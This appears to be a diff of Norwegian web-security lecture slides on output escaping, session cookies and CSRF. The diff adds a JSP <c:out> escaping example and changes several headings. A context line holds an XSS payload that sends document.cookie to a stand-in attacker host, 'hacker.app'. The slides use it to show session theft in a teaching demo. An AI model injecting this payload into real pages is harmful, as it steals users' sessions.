@@ -25,7 +25,7 @@ class: middle
 ---
 class: middle
 
-## Vi skal _ikke_ se på
+# Vi skal _ikke_ se på
 
 - Mass assignment
 - Kryptering, TLS (HTTPS)
@@ -122,7 +122,10 @@ Output må _alltid_ escapes!
 2. Hvis du kan la være, ikke bruk jsp for å produsere html!!
   - Thymeleaf
   - Mustache
-1. Hvis du _må_ bruke jsp, bruk `<c:out>`
+1. Hvis du _må_ bruke jsp, bruk `<c:out>`:
+   ```html
+   <c:out value="${transaction.comment}"/>
+   ```
 
 ---
 class: middle
@@ -133,6 +136,8 @@ class: middle
 
 ---
 class: middle
+
+# Sesjons-cookies
 
 - Sesjoner på web = cookies
 - De må ikke kunne stjeles!
@@ -161,7 +166,7 @@ new Image().src='http://hacker.app:3000/xss?content='+escape(document.cookie);
 ---
 class: middle
 
-## Lærdom:
+# Lærdom
 
 Brukers sesjon ble stjålet!
 
@@ -177,7 +182,7 @@ class: middle
 ---
 class: middle
 
-## CSRF
+# CSRF
 
 - Man kan lure brukere til å utføre handlinger på en site uten å vite/samtykke
 - Vi skal lure bruker til å gjøre overføring i woops
